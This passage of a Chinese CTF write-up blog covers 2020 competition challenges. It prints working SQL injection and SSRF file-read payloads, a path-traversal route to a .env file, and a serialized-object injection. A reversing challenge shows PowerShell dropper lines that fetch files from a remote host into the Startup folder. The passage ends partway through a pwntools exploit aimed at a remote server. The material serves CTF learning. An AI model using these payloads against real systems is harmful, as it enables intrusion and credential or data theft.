<p><code>www.verymuch.net</code></p>
<p>解密得到<code>love and peaceee</code></p>
<p>刚刚base64解密的带<code>Salted__</code>， 大概率是rabbit加密 </p>
<p>解密得到</p>
<pre><code
</code></pre><p>base32+unicode+与佛论禅得到：<code>Live beautifully, dream passionately, love completely.</code></p>
<p>解压给的压缩包，看频谱图，得到flag</p>
<h3 id="broken-secret"><a href="#broken-secret" class="headerlink" title="broken secret"></a>broken secret</h3><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E5%A4%AA%E6%B9%96%E6%9D%AF/misc3.png" alt="图片"></p>
<h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="Certificate-Authority"><a href="#Certificate-Authority" class="headerlink" title="Certificate Authority"></a>Certificate Authority</h3><p>或许相关：</p>
<p><a href="https://research.kudelskisecurity.com/2020/01/15/cve-2020-0601-the-chainoffools-attack-explained-with-poc/" target="_blank" rel="noopener">https://research.kudelskisecurity.com/2020/01/15/cve-2020-0601-the-chainoffools-attack-explained-with-poc/</a></p>
<p><a href="http://showlinkroom.me/2020/01/21/CVE-2020-0601-Research/" target="_blank" rel="noopener">http://showlinkroom.me/2020/01/21/CVE-2020-0601-Research/</a></p>
<h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2020第九届全国电信互联网网安竞赛WP</title>
    <url>/2020/11/06/di-jiu-jie-quan-guo-dian-xin-hu-lian-wang-wang-an-jing-sai/</url>
    <content><![CDATA[<blockquote>
<p>比赛题目都存了一份打包上传了，链接如下：</p>
<p>链接: <a href="https://pan.baidu.com/s/1YI5rWxrDW-8fXzSQOfHNig" target="_blank" rel="noopener">https://pan.baidu.com/s/1YI5rWxrDW-8fXzSQOfHNig</a>  密码: ahaq</p>
</blockquote>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="easysql【已解决】"><a href="#easysql【已解决】" class="headerlink" title="easysql【已解决】"></a>easysql【已解决】</h3><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E4%BA%92%E8%81%94%E7%BD%91%E7%BD%91%E5%AE%89%E7%AB%9E%E8%B5%9B/web1.png" alt="图片"></p>
<p>uname=a’) union select 1,extractvalue(1, concat(0x7e, (select database()),0x7e))#&amp;passwd=a</p>
<p>datavase</p>
<p>[*] security</p>
<p>Database: security</p>
<p>[5 tables]</p>
<p>+———-+</p>
<p>| emails   |</p>
<p>| flag     |</p>
<p>| referers |</p>
<p>| uagents  |</p>
<p>| users    |</p>
<p>+———-+</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E4%BA%92%E8%81%94%E7%BD%91%E7%BD%91%E5%AE%89%E7%AB%9E%E8%B5%9B/web1-2.png" alt="图片"></p>
<p>查列：</p>
<pre class=" language-plain"><code class="language-plain">uname=a') union select 1,extractvalue(1, concat(0x7e, (select * from (select * from flag as a join flag b)c),0x7e))#&passwd=a</code></pre>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E4%BA%92%E8%81%94%E7%BD%91%E7%BD%91%E5%AE%89%E7%AB%9E%E8%B5%9B/web1-3.png" alt="图片"></p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E4%BA%92%E8%81%94%E7%BD%91%E7%BD%91%E5%AE%89%E7%AB%9E%E8%B5%9B/web1-4.png" alt="图片"></p>
<p>flag{c7651cb673c911ee8f9977094a220f17}</p>
<h3 id="ezsqli【已解决】"><a href="#ezsqli【已解决】" class="headerlink" title="ezsqli【已解决】"></a>ezsqli【已解决】</h3><p>flag{de3110dce011088cd4add1950a49182f}</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E4%BA%92%E8%81%94%E7%BD%91%E7%BD%91%E5%AE%89%E7%AB%9E%E8%B5%9B/web2.png" alt="图片"></p>
<h3 id="Secret-Guess"><a href="#Secret-Guess" class="headerlink" title="Secret Guess"></a>Secret Guess</h3><p><a href="http://124.71.167.32:32768/" target="_blank" rel="noopener">http://124.71.167.32:32768/</a></p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> env <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'dotenv'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">config</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> bodyParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> hbs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'hbs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> process <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'/static'</span><span class="token punctuation">,</span> express<span class="token punctuation">.</span><span class="token keyword">static</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'public'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">{</span> extended<span class="token punctuation">:</span> <span class="token boolean">false</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span><span class="token string">'views'</span><span class="token punctuation">,</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">"views/"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
app<span class="token punctuation">.</span><span class="token function">engine</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">,</span> hbs<span class="token punctuation">.</span>__express<span class="token punctuation">)</span>
app<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span><span class="token string">'view engine'</span><span class="token punctuation">,</span> <span class="token string">'html'</span><span class="token punctuation">)</span>
app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"index"</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>auth <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>auth <span class="token operator">===</span> <span class="token string">'string'</span> <span class="token operator">&amp;&amp;</span> crypto<span class="token punctuation">.</span><span class="token function">createHash</span><span class="token punctuation">(</span><span class="token string">'md5'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>env<span class="token punctuation">.</span>parsed<span class="token punctuation">.</span>secret<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span> <span class="token operator">===</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>auth <span class="token punctuation">)</span> <span class="token punctuation">{</span>
        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"index"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>result<span class="token punctuation">:</span> process<span class="token punctuation">.</span><span class="token function">execSync</span><span class="token punctuation">(</span><span class="token string">"echo $FLAG"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"index"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>result<span class="token punctuation">:</span> <span class="token string">"wrong secret"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/source'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">"app.js"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span> <span class="token string">"0.0.0.0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>CVE-2017-14849漏洞</p>
<p>flag在 static/../../foo/../../../usr/local/app/.env</p>
<p>buuoj上有环境 直接复现一下</p>
<p><a href="https://paper.seebug.org/439/" target="_blank" rel="noopener">https://paper.seebug.org/439/</a></p>
<h3 id="SSRF-ME"><a href="#SSRF-ME" class="headerlink" title="SSRF ME"></a>SSRF ME</h3><p>一个简单的SSRF？？？</p>
<p><a href="http://124.71.187.100:8079/" target="_blank" rel="noopener">http://124.71.187.100:8079/</a></p>
<p>读文件，读到index：</p>
<pre class=" language-plain"><code class="language-plain"><!--?php
error_reporting(0);
session_start();
require_once "lib.php";
init();

$is_die = 0;
$is_post = 0;
$die_mess = '';
$url = '';

if (isset($_POST['url']) && isset($_POST['captcha']) && !empty($_POST['url']) && !empty($_POST['captcha']))
{
$url = $_POST['url'];
$captcha = $_POST['captcha'];
$is_post = 1;
if ( $captcha !== $_SESSION['answer'])
{
$die_mess = "wrong captcha";
$is_die = 1;
}

if ( preg_match('/flag|proc|log/i', $url) )
{
$die_mess = "hacker";
$is_die = 1;
}
}

?--></code></pre>
<p>lib.php</p>
<pre class=" language-plain"><code class="language-plain"><!--?php
session_start();
function curl($url){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$output = curl_exec($ch);
curl_close($ch);
return $output;
}

function set_session()
{
$answer = rand(1,100000);
$_SESSION['captcha'] = substr(md5($answer),-6,6);
$_SESSION['answer'] = strval($answer);
}

function destroy_session()
{
$_SESSION = [];
}

function init()
{
if (!isset($_SESSION['captcha']) || !isset($_SESSION['answer']) || isset($_GET['reset']))
{
destroy_session();
set_session();
isset($_GET['reset']) ? die("<script--></code></pre>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E4%BA%92%E8%81%94%E7%BD%91%E7%BD%91%E5%AE%89%E7%AB%9E%E8%B5%9B/web3.png" alt="图片"></p>
<p>/etc/apache2/apache2.conf</p>
<p><a href="file:///etc/apache2/sites-enabled/000-default.conf">file:///etc/apache2/sites-enabled/000-default.conf</a></p>
<pre class=" language-plain"><code class="language-plain">ServerAdmin webmaster@localhost DocumentRoot /var/www/html ErrorLog ${APACHE_LOG_DIR}/error.log CustomLog ${APACHE_LOG_DIR}/access.log combined 
ServerAdmin secret@localhost DocumentRoot /var/www/htmlssrf123123 ErrorLog ${APACHE_LOG_DIR}/error.log CustomLog ${APACHE_LOG_DIR}/access.log combined</code></pre>
<p><a href="file:///etc/apache2/ports.conf">file:///etc/apache2/ports.conf</a></p>
<pre><code>Listen 80 Listen 47852 Listen 443 Listen 443</code></pre><p>读第二个web目录读文件：<br><a href="file:///var/www/htmlssrf123123/index.php">file:///var/www/htmlssrf123123/index.php</a></p>
<pre class=" language-plain"><code class="language-plain"><!--?php
    if(isset($_POST['cmd'])){
        exec($_POST['cmd']);
    } 
?--></code></pre>
<p>盲RCE<br>官方WP：</p>
<p>双层编码绕过= =</p>
<pre class=" language-plain"><code class="language-plain">payload：
file:///%66%6c%61%67
flag{8f62d75de5b51d69799790cdf2cf05d4}</code></pre>
<h3 id="warmup【已解决】"><a href="#warmup【已解决】" class="headerlink" title="warmup【已解决】"></a>warmup【已解决】</h3><pre class=" language-php"><code class="language-php">    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">check_login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token operator">===</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"database error, please check your input"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">===</span> <span class="token keyword">NULL</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"username or password incorrect!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token string">"welcome, admin! this is your flag -> "</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string">"welcome! but you are not admin"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">waf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">conn</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span> <span class="token punctuation">(</span><span class="token string">"select username,password from "</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">table</span><span class="token punctuation">.</span><span class="token string">" where username='"</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">.</span><span class="token string">"' and password='"</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">.</span><span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"union"</span><span class="token punctuation">,</span> <span class="token string">"join"</span><span class="token punctuation">,</span> <span class="token string">"!"</span><span class="token punctuation">,</span> <span class="token string">"\""</span><span class="token punctuation">,</span> <span class="token string">"#"</span><span class="token punctuation">,</span> <span class="token string">"$"</span><span class="token punctuation">,</span> <span class="token string">"%"</span><span class="token punctuation">,</span> <span class="token string">"&amp;"</span><span class="token punctuation">,</span> <span class="token string">"."</span><span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token string">":"</span><span class="token punctuation">,</span> <span class="token string">";"</span><span class="token punctuation">,</span> <span class="token string">"^"</span><span class="token punctuation">,</span> <span class="token string">"_"</span><span class="token punctuation">,</span> <span class="token string">"`"</span><span class="token punctuation">,</span> <span class="token string">"{"</span><span class="token punctuation">,</span> <span class="token string">"|"</span><span class="token punctuation">,</span> <span class="token string">"}"</span><span class="token punctuation">,</span> <span class="token string">"&lt;"</span><span class="token punctuation">,</span> <span class="token string">">"</span><span class="token punctuation">,</span> <span class="token string">"?"</span><span class="token punctuation">,</span> <span class="token string">"@"</span><span class="token punctuation">,</span> <span class="token string">"["</span><span class="token punctuation">,</span> <span class="token string">"\\"</span><span class="token punctuation">,</span> <span class="token string">"]"</span> <span class="token punctuation">,</span> <span class="token string">"*"</span><span class="token punctuation">,</span> <span class="token string">"+"</span><span class="token punctuation">,</span> <span class="token string">"-"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strripos</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">table</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'bad hacker,go out!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strripos</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'bad hacker,go out!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strripos</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'bad hacker,go out!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span></code></pre>
<p>YToxOntzOjI6ImlwIjtzOjEyOiIxODMuMjM2LjAuOTEiO30=</p>
<p>a:1:{s:2:”ip”;s:12:”183.236.0.91”;}</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>

<span class="token keyword">class</span> <span class="token class-name">SQL</span> <span class="token punctuation">{</span>

    <span class="token keyword">public</span> <span class="token variable">$table</span><span class="token operator">=</span><span class="token string">"users"</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string">"admin"</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string">"admin' or '1'='1"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$SQL</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SQL</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$SQL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>再base64编码就行了</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E4%BA%92%E8%81%94%E7%BD%91%E7%BD%91%E5%AE%89%E7%AB%9E%E8%B5%9B/web4.png" alt="图片"></p>
<p>flag{5dd2d5f45fw6e6f11ewf1f224f5121e2}</p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="emisc"><a href="#emisc" class="headerlink" title="emisc"></a>emisc</h3><p>elf可执行文件</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E4%BA%92%E8%81%94%E7%BD%91%E7%BD%91%E5%AE%89%E7%AB%9E%E8%B5%9B/misc1.png" alt="图片"></p>
<h2 id="你觉得这个是什么文件"><a href="#你觉得这个是什么文件" class="headerlink" title="你觉得这个是什么文件"></a>你觉得这个是什么文件</h2><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E4%BA%92%E8%81%94%E7%BD%91%E7%BD%91%E5%AE%89%E7%AB%9E%E8%B5%9B/misc2.png" alt="图片"></p>
<h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="html"><a href="#html" class="headerlink" title="html"></a>html</h3><pre class=" language-plain"><code class="language-plain"># $client = new-object System.Net.WebClient;
# $client.DownloadFile("http://192.168.69.129:8000/ielogo.png", "$env:temp/20203917.tmp")
# $client.DownloadFile("http://192.168.69.129:8000/_TMP12", "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\helper.bat")

# read file
$content = [IO.File]::ReadAllText("$pwd\doc.chm")
$idx1 = $content.IndexOf("xxxxxxxx")

$helper = $content.Substring($idx1 + 8)
$cont = [System.Convert]::FromBase64String($helper)

Set-Content "$env:temp\20201122.tmp" $cont -Encoding byte</code></pre>
<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="noteplus【已解决】"><a href="#noteplus【已解决】" class="headerlink" title="noteplus【已解决】"></a>noteplus【已解决】</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python2</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>



LOCAL <span class="token operator">=</span> <span class="token boolean">False</span>
binfile<span class="token operator">=</span><span class="token string">'./noteplus'</span>
libcfile<span class="token operator">=</span><span class="token string">'./libc-2.27.so'</span>
offset<span class="token operator">=</span><span class="token number">0</span>



e<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binfile<span class="token punctuation">)</span>

context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span>e<span class="token punctuation">.</span>arch
<span class="token keyword">if</span> context<span class="token punctuation">.</span>arch<span class="token operator">==</span><span class="token string">'i386'</span><span class="token punctuation">:</span>
    x86<span class="token operator">=</span><span class="token boolean">True</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    x86<span class="token operator">=</span><span class="token boolean">False</span>

<span class="token keyword">if</span> LOCAL<span class="token punctuation">:</span>
    c <span class="token operator">=</span> process<span class="token punctuation">(</span>binfile<span class="token punctuation">)</span>
    <span class="token keyword">if</span> libcfile<span class="token punctuation">:</span>
        libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span>libcfile<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> x86<span class="token punctuation">:</span>
            libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'/lib/i386-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    c <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'121.36.245.213'</span><span class="token punctuation">,</span><span class="token number">23333</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> libcfile<span class="token punctuation">:</span>
        libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span>libcfile<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
  c<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'ce: '</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>
  c<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
  c<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Size: '</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">rm</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
  c<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'ce: '</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span>
